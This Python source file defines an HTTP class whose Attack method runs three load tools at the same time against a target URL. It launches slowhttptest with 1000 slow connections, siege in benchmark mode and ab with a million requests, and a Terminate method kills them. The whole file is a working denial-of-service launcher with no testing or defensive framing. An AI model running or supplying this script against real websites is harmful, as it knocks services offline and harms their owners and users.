# -*- coding: utf-8 -*-
import subprocess
import time
import os
import signal
class HTTP():
    def __init__(self,url):

        self.COMAND1 = "slowhttptest -c 1000 -H -i 1000 -r 20000 -t GET -u {}".format(url)
        self.COMAND2 = "siege -i -b -c 100 {}".format(url)
        self.COMAND3 = "ab -c 1000 -n 1000000 {}".format(url)

        self.proc1 = None
        self.proc2 = None
        self.proc3 = None

    def Attack(self):
        self.proc1 = subprocess.Popen(self.COMAND1.split() , stdout=subprocess.PIPE , preexec_fn=os.setsid)
        self.proc2 = subprocess.Popen(self.COMAND2.split() , stdout=subprocess.PIPE , preexec_fn=os.setsid)
        self.proc3 = subprocess.Popen(self.COMAND3.split() , stdout=subprocess.PIPE , preexec_fn=os.setsid)

    def Terminate(self):
        #self.proc1.terminate()
        #self.proc2.terminate()
        #self.proc3.terminate()
        os.kill(self.proc1.pid , 9)
        os.kill(self.proc2.pid , 9)
        os.kill(self.proc3.pid , 9)